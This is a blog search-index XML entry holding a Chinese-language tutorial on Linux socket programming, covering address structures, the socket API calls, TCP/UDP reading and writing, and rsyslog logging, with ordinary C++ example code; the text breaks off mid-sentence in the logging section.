<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux网络编程</title>
    <link href="/2025/04/03/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2025/04/03/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="网络编程基础api">网络编程基础API</h2><p><strong>补充知识</strong></p><ul><li>主机字节序：一般为<strong>小端序</strong>（低位放在较小的地址处，高位放在较大的地址处）</li><li>网络字节序：一般为<strong>大端序</strong></li></ul><p>示例：0x01234567，其中 0x01 是最高位有效字节，0x67是最低位有效字节</p><h3 id="套接字地址">套接字地址</h3><p>套接字地址（<strong>Socket Address</strong>）是 <strong>IP地址和端口号的组合</strong>，用于唯一标识网络上的一个进程。</p><ol type="1"><li><p><code>struct sockaddr</code></p><p><code>sockaddr</code>是一个<strong>通用的地址结构体</strong>，它的定义如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;  <span class="comment">// 地址族（AF_INET, AF_INET6等）</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];       <span class="comment">// 地址数据（具体的地址信息）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><strong>成员解析</strong>：</p><ul><li><code>sa_family_t sa_family</code>：地址族（例如<code>AF_INET</code> 表示 IPv4，<code>AF_INET6</code> 表示 IPv6）。</li><li><code>char sa_data[14]</code>：存储具体的地址数据（IP 地址 +端口）。</li></ul><p><strong>⚠️ <code>sockaddr</code>本身不会直接使用，而是由更具体的结构体（如 <code>sockaddr_in</code> 和<code>sockaddr_in6</code>）进行扩展。</strong></p></li><li><p><code>sockaddr_in</code>（IPv4 地址）</p><p><code>sockaddr_in</code> 结构体是 <code>sockaddr</code>的<strong>专门版本</strong>，用于<strong>IPv4 地址</strong>：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span>  <span class="comment">// sockaddr_in 定义在这个头文件中</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sin_family;   <span class="comment">// 地址族（必须是 AF_INET）</span></span><br><span class="line">    <span class="type">in_port_t</span> sin_port;       <span class="comment">// 端口号（网络字节序）</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;  <span class="comment">// IPv4 地址</span></span><br><span class="line">    <span class="type">char</span> sin_zero[<span class="number">8</span>];         <span class="comment">// 备用字段（填充用，一般不用）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这里的<code>struct in_addrc</code>的详细代码定义在<code>&lt;netinet/in.h&gt;</code>文件头中：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">in_addr</span> {</span><br><span class="line">    <span class="type">uint32_t</span> s_addr;  <span class="comment">// 32 位 IPv4 地址（网络字节序）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></blockquote><p><strong>示例代码（IPv4 地址转换）：</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>  <span class="comment">// 包含 inet_pton 和 inet_ntoa</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">8080</span>);  <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    <span class="built_in">inet_pton</span>(AF_INET, <span class="string">"192.168.1.1"</span>, &amp;addr.sin_addr);  <span class="comment">// 将IP字符串转换为二进制格式</span></span><br><span class="line">    <span class="comment">// 第三个参数 &amp;addr.sin_addr 表示转换后的二进制 IP 地址的存储位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印转换后的信息</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"IP: "</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(addr.sin_addr) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Port: "</span> &lt;&lt; <span class="built_in">ntohs</span>(addr.sin_port) &lt;&lt; std::endl;  <span class="comment">// 端口转换回主机字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>函数解析</strong>：</p><ul><li><code>htons(port)</code>：将主机字节序的<strong>端口号</strong>转换为<strong>网络字节序</strong>。</li><li><code>ntohs(port)</code>：将网络字节序的<strong>端口号</strong>转换回<strong>主机字节序</strong>。</li><li><code>inet_pton(AF_INET, "192.168.1.1", &amp;addr.sin_addr)</code>：将IPv4 字符串转换为二进制格式。为了后续的 socket 操作（例如<code>connect</code> 或 <code>bind</code>）能够使用正确的二进制格式的 IP地址。</li><li><code>inet_ntoa(addr.sin_addr)</code>：将二进制 <strong>IP地址</strong>转换为可读的字符串。</li></ul></li><li><p><code>sockaddr_in6</code>（IPv6 地址）</p><p>IPv6 地址使用 <code>sockaddr_in6</code> 结构体：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sin6_family;     <span class="comment">// 地址族（必须是 AF_INET6）</span></span><br><span class="line">    <span class="type">in_port_t</span> sin6_port;         <span class="comment">// 端口号（网络字节序）</span></span><br><span class="line">    <span class="type">uint32_t</span> sin6_flowinfo;      <span class="comment">// IPv6 流量控制信息（一般设为 0）</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr;   <span class="comment">// IPv6 地址</span></span><br><span class="line">    <span class="type">uint32_t</span> sin6_scope_id;      <span class="comment">// 作用域 ID（用于本地连接）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><strong>示例代码（IPv6 地址转换）：</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> addr6;</span><br><span class="line">    addr6.sin6_family = AF_INET6;</span><br><span class="line">    addr6.sin6_port = <span class="built_in">htons</span>(<span class="number">9090</span>);  <span class="comment">// 端口号</span></span><br><span class="line">    <span class="built_in">inet_pton</span>(AF_INET6, <span class="string">"::1"</span>, &amp;addr6.sin6_addr);  <span class="comment">// 将 IPv6 地址转换为二进制</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ip_str[INET6_ADDRSTRLEN];</span><br><span class="line">    <span class="built_in">inet_ntop</span>(AF_INET6, &amp;addr6.sin6_addr, ip_str, <span class="built_in">sizeof</span>(ip_str));  <span class="comment">// 转换回可读字符串</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"IPv6: "</span> &lt;&lt; ip_str &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Port: "</span> &lt;&lt; <span class="built_in">ntohs</span>(addr6.sin6_port) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>IPv6 相关函数</strong>：</p><ul><li><code>inet_pton(AF_INET6, "::1", &amp;addr6.sin6_addr)</code>：将IPv6 地址字符串转换为二进制格式。</li><li><code>inet_ntop(AF_INET6, &amp;addr6.sin6_addr, ip_str, sizeof(ip_str))</code>：将IPv6 二进制地址转换回字符串。</li></ul></li></ol><h3 id="创建套接字">创建套接字</h3><p>socket系统调⽤成功时返回⼀个socket⽂件描述符，失败则返回-1</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>＜sys/socket.h＞</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span><span class="params">(<span class="type">int</span> domain,<span class="type">int</span> type,<span class="type">int</span> protocol)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>参数解析：</strong></p><ul><li><code>domain</code>（协议族）：<code>AF_INET</code>（IPv4）、<code>AF_INET6</code>（IPv6）、<code>AF_UNIX</code>（本地通信）</li><li><code>type</code>（套接字类型）：<code>SOCK_STREAM</code>（流服务，TCP）、<code>SOCK_DGRAM</code>（数据报服务，UDP）</li><li><code>protocol</code>（协议）：<code>0</code>（默认），<code>IPPROTO_TCP</code>（TCP），<code>IPPROTO_UDP</code>（UDP）</li></ul><h3 id="绑定套接字">绑定套接字</h3><p><code>bind</code>函数<strong>将套接字（socket）与本地 IP地址和端口号绑定</strong>，即上面提到的两个关键字，这样客户端可以连接到该地址。成功时返回0，失败则返回-1</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>参数解析：</strong></p><ul><li><code>sockfd</code>：<strong>要绑定的 socket 文件描述符</strong>（由<code>socket()</code> 创建）</li><li><code>addr</code>：<strong>要绑定的本地地址（IP +端口）</strong>，需要转换为 <code>sockaddr*</code>类型（默认套接字地址类型）</li><li><code>addrlen</code>：<strong>地址结构体的大小</strong>（通常用<code>sizeof(struct sockaddr_in)</code>）</li></ul><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> sockfd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);  <span class="comment">// 创建 TCP 套接字</span></span><br><span class="line">    <span class="keyword">if</span> (sockfd == <span class="number">-1</span>) {</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr {};</span><br><span class="line">    addr.sin_family = AF_INET;  <span class="comment">// 使用 IPv4</span></span><br><span class="line">    addr.sin_addr.s_addr = INADDR_ANY;  <span class="comment">// 绑定到本机所有 IP</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">8080</span>);  <span class="comment">// 绑定端口 8080</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">bind</span>(sockfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="built_in">sizeof</span>(addr)) == <span class="number">-1</span>) {</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">"bind failed"</span>);</span><br><span class="line">        <span class="built_in">close</span>(sockfd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Socket bound to port 8080"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">close</span>(sockfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="监听套接字">监听套接字</h3><p><code>listen</code>函数创建⼀个监听队列以存放待处理的客户连接。成功时返回0，失败则返回-1。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>参数解析：</strong></p><ul><li><code>sockfd</code>：socket 文件描述符，通常是通过<code>socket()</code> 创建并已绑定地址和端口的 socket</li><li><code>backlog</code>：连接队列的最大长度。<ul><li>当多个客户端同时尝试连接服务器时，未处理的连接请求会被放入队列中。</li><li><code>backlog</code>指定了队列的最大长度。如果队列已满，新的连接请求会被拒绝。</li></ul></li></ul><blockquote><p>监听队列中<strong><code>ESTABLISHED</code> 状态</strong> 的连接表示<strong>三次握手成功</strong>，连接已建立，可以通信。但此时连接还在<strong>监听队列</strong> 中，服务器端还<strong>不能直接读写数据</strong>，需要通过 <code>accept()</code>取出连接。</p></blockquote><h3 id="接受连接">接受连接</h3><p><code>accept</code>函数从<code>listen</code>监听队列中接受⼀个连接。成功返回新的<strong>已连接套接字描述符</strong>，用于与客户端通信；失败返回<code>-1</code>。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>参数解析：</strong></p><ul><li><code>sockfd</code>：socket文件描述符（这里是被监听的socket）</li><li><code>addr</code>：指向存储客户端地址信息的结构体，通常为<code>sockaddr_in</code> 或 <code>sockaddr_in6</code></li><li><code>addrlen</code>：指向地址长度的指针，调用前应设置为<code>addr</code> 的长度，调用后会被修改为实际地址长度。</li></ul><h3 id="发起连接">发起连接</h3><p><code>connect</code>函数⽤来主动与服务器建⽴连接。成功返回<code>0</code>，失败返回<code>-1</code>。⼀旦成功建⽴连接，sockfd就唯⼀地标识了这个连接，客户端就可以通过读写<code>sockfd</code>来与服务器通信。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>参数解析：</strong></p><ul><li><code>sockfd</code>：文件描述符</li><li><code>addr</code>：<strong>服务器地址</strong>信息，包括 IP和端口。</li><li><code>addrlen</code>：<code>addr</code>的大小</li></ul><blockquote><p><strong><code>connect</code> 是客户端主动建立连接</strong></p><p><strong><code>accept</code>是服务器被动接受连接</strong></p></blockquote><h3 id="关闭连接">关闭连接</h3><h4 id="close">close</h4><p>关闭<code>sockfd</code>对应的socket连接。成功返回<code>0</code>，失败返回<code>-1</code>。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">close</span><span class="params">(<span class="type">int</span> sockfd)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>引用计数机制</strong>：</p><ul><li>内核维护<strong>文件描述符的引用计数</strong>。</li><li>调用 <code>close()</code> 时，引用计数 <strong>减 1</strong>。</li><li>当引用计数为 0，才真正关闭连接</li></ul><h4 id="shutdown">shutdown</h4><p>如果⽆论如何都要⽴即终⽌连接（⽽不是将socket的引⽤计数减1），可以使⽤的<code>shutdown</code>系统调⽤。成功时返回<code>0</code>，失败则返回<code>-1</code>。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shutdown</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> how)</span></span>;</span><br><span class="line"><span class="comment">/* how 参数表示关闭方式：SHUT_RD、SHUT_WR、SHUT_RDWR */</span></span><br></pre></td></tr></tbody></table></figure><p><code>shutdown</code>能够分别关闭socket上的读或写，或者都关闭。⽽<code>close</code>在关闭连接时只能将socket上的读和写同时关闭。</p><h3 id="数据读写">数据读写</h3><p>对文件的读写操作<code>read</code>和<code>write</code>同样适用于socket</p><h4 id="tcp数据读写">TCP数据读写</h4><ol type="1"><li><p><code>send()</code></p><p><strong>发送数据</strong>到已连接的 <strong>TCP套接字</strong>中。成功则返回<strong>实际发送的字节数</strong>，失败则返回<code>-1</code> 。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">send</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>sockfd</code>：已连接的套接字描述符</li><li><code>buf</code>：指向<strong>待发送数据</strong>的缓冲区</li><li><code>len</code>：带发送数据的长度</li><li><code>flags</code>：控制发送行为（一般为0）<ul><li><code>0</code>：标准阻塞发送</li><li><code>MSG_DONTWAIT</code>：<strong>非阻塞发送</strong>，若缓冲区满，则立即返回</li><li><code>MSG_NOSIGNAL</code>：<strong>不触发 SIGPIPE信号</strong>，在对端关闭时返回错误</li></ul></li></ul></li><li><p><code>recv()</code></p><p><strong>从 TCP套接字接收数据</strong>并存入缓冲区。成功则返回<strong>接收到的字节数</strong>（<code>0</code>：表示<strong>对方关闭连接</strong>，即发送了 <code>FIN</code>包），失败则返回<code>-1</code>。可能要多次调⽤<code>recv</code></p><p><strong>失败</strong>：返回 <code>-1</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>sockfd</code>：已连接的套接字描述符</li><li><code>buf</code>：指向<strong>存放接收数据</strong>的缓冲区</li><li><code>len</code>：缓冲区大小</li><li><code>flags</code>：控制发送行为（一般为0）<ul><li><code>0</code>：标准阻塞接收</li><li><code>MSG_DONTWAIT</code>：<strong>非阻塞接收</strong>，若无数据则立即返回</li><li><code>MSG_PEEK</code>：<strong>窥视模式</strong>，读取数据但不删除缓冲区中的内容</li></ul></li></ul></li></ol><h4 id="udp数据报读写">UDP数据报读写</h4><ol type="1"><li><p><code>sendto()</code></p><p>发送 UDP数据报到指定的目标地址。成功则返回<strong>实际发送的字节数</strong>，失败则返回<code>-1</code>。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="type">const</span> <span class="keyword">struct</span> sockaddr *dest_addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>sockfd</code>： 套接字描述符</li><li><code>buf</code>：指向 <strong>待发送数据</strong> 的缓冲区</li><li><code>len</code>：待发送数据长度</li><li><code>flags</code>：控制发送行为（一般为0）</li><li><code>dest_addr</code>（结构体）：目标地址，通常为<code>sockaddr_in</code> 或 <code>sockaddr_in6</code></li><li><code>addrlen</code>：目标地址结构体的大小</li></ul></li><li><p><code>recvfrom()</code></p><p>接收 UDP数据报并保存到缓冲区中。成功则返回<strong>实际接收的字节数</strong>，失败则返回<code>-1</code>。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags, </span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">struct</span> sockaddr *src_addr, <span class="type">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>sockfd</code>：套接字描述符</li><li><code>buf</code>：指向<strong>存放接收数据</strong>的缓冲区</li><li><code>len</code>：缓冲区大小</li><li><code>flags</code>：控制发送行为（一般为0）</li><li><code>src_addr</code>：存放发送地址的结构体指针</li><li><code>addrlen</code>：发送方地址结构体的大小</li></ul></li></ol><h4 id="通用数据读写">通用数据读写</h4><p>不仅能⽤于TCP流数据，也能⽤于UDP数据报</p><ol type="1"><li><p><code>sendmsg</code></p><p>成功则返回发送的字节数，失败返回 <code>-1</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> msghdr *msg, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>sockfd</code>：套接字描述符。</li><li><code>msg</code>：指向 <strong><code>msghdr</code>结构体</strong>，包含要发送的数据、目标地址、控制信息。</li><li><code>flags</code>：发送标志，如<code>MSG_DONTWAIT</code>、<code>MSG_EOR</code>。</li></ul></li><li><p><code>recvmsg</code></p><p>成功则返回接收的字节数，失败返回 <code>-1</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> msghdr *msg, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure></li></ol><blockquote><p><code>msghdr</code>结构体详解</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">msghdr</span> {</span><br><span class="line">    <span class="type">void</span>         *msg_name;       <span class="comment">// 地址信息 (UDP：目标地址 / 源地址；对于⾯向连接的TCP协议，该成员没有意义)</span></span><br><span class="line">    <span class="type">socklen_t</span>     msg_namelen;    <span class="comment">// 地址长度</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> *msg_iov;        <span class="comment">// 数据缓冲区数组</span></span><br><span class="line">    <span class="type">size_t</span>        msg_iovlen;     <span class="comment">// 数据缓冲区个数</span></span><br><span class="line">    <span class="type">void</span>         *msg_control;    <span class="comment">// 控制信息缓冲区</span></span><br><span class="line">    <span class="type">size_t</span>        msg_controllen; <span class="comment">// 控制信息长度</span></span><br><span class="line">    <span class="type">int</span>           msg_flags;      <span class="comment">// 消息标志</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="总结">总结</h3><h4 id="服务端-tcp">服务端 (TCP)</h4><ol type="1"><li><strong><code>socket()</code></strong>：创建套接字</li><li><strong><code>bind()</code></strong>：绑定 IP 地址和端口号</li><li><strong><code>listen()</code></strong>：监听客户端连接请求</li><li><strong><code>accept()</code></strong>：接受客户端连接</li><li><strong><code>send()</code> /<code>recv()</code></strong>：读写数据</li><li><strong><code>close()</code></strong>：关闭套接字</li></ol><h4 id="客户端-tcp">客户端 (TCP)</h4><ol type="1"><li><strong><code>socket()</code></strong>：创建套接字</li><li><strong><code>connect()</code></strong>：连接服务器</li><li><strong><code>send()</code> /<code>recv()</code></strong>：读写数据</li><li><strong><code>close()</code></strong>：关闭套接字</li></ol><blockquote><p><strong>客户端</strong> 不调用 <code>bind()</code> 是为了<strong>简化编程</strong> 和<strong>方便操作系统自动分配端口</strong>。</p><p><strong>服务端</strong> 必须调用 <code>bind()</code> 来<strong>指定监听的 IP 地址和端口号</strong>，以便<strong>客户端能够连接</strong>。</p></blockquote><h2 id="高级io函数">高级I/O函数</h2><p><code>pipe</code>、<code>dup</code>、<code>readv</code>、<code>sendfile</code>、<code>mmap</code>、<code>tee</code>、<code>fcntl</code></p><p><code>splice</code>：用于在两个文件描述符之间移动数据，而无需将数据从内核空间复制到用户空间，<strong>直接在内核空间</strong>中完成数据的传输。。它通常用于高效地将数据从一个文件描述符（例如管道、socket或文件）传输到另一个文件描述符。核心原理是它利用了 Linux内核的<strong>零拷贝（Zero-Copy）技术</strong></p><h2 id="linux服务器程序规范">Linux服务器程序规范</h2><p><strong>AF_UNIX Socket 类型</strong></p><ul><li><strong>AF_UNIX</strong> 是一种本地进程间通信（IPC）的 Socket类型，也称为 <strong>Unix Domain Socket (UDS)</strong>。</li><li>它用于 <strong>同一台机器</strong>上不同进程之间的通信，不涉及网络传输。</li><li>通信数据不会经过网络协议栈，因此<strong>效率高、延迟低、开销小</strong>。</li></ul><h3 id="日志">日志</h3><ul><li><p><code>rsyslog</code> 是 Linux系统中功能强大的日志管理工具，具有高性能、模块化、支持多种协议和格式化输出的特点。</p></li><li><p><strong>rsyslogd 守护进程</strong> 在接收到<strong>用户进程</strong> 或 <strong>内核</strong>输入的日志后，会按照配置文件中的规则，将它们输出到特定的<strong>日志文件</strong> 中。</p></li></ul><p>下面是<strong>日志处理流程</strong></p><ol type="1"><li><p><strong>日志收集</strong>：</p><ul><li><p><strong>用户进程日志</strong>：通过调用 <code>syslog()</code>函数，将日志写入 <code>/dev/log</code>（AF_UNIX Socket）。</p><blockquote><ul><li><p><strong><code>syslog()</code></strong> 是 C语言标准库中的一个函数，用于<strong>向系统日志发送消息</strong>。</p></li><li><p>日志通过 <strong>AF_UNIX Socket</strong> 发送到<code>/dev/log</code> 文件，由 <code>rsyslogd</code>或其他系统日志守护进程收集、处理并写入日志文件。</p></li><li><p>典型用途：记录程序运行状态、错误信息、安全事件等，便于调试和维护</p></li></ul></blockquote></li><li><p><strong>内核日志</strong>：通过 <code>klog</code>模块从内核中收集日志，例如启动、硬件、中断等信息。</p></li></ul></li><li><p><strong>rsyslogd 获取日志</strong>：</p><ul><li><code>rsyslogd</code> 守护进程监听 <code>/dev/log</code> 和<code>/proc/kmsg</code>（内核日志），获取日志数据。</li></ul></li><li><p><strong>日志过滤与分类</strong>：</p><ul><li>根据配置文件（如 <code>/etc/rsyslog.conf</code> 和<code>/etc/rsyslog.d/*.conf</code>）中的规则进行过滤和分类。</li><li>规则由 Facility（日志来源） 和 Level（日志级别） 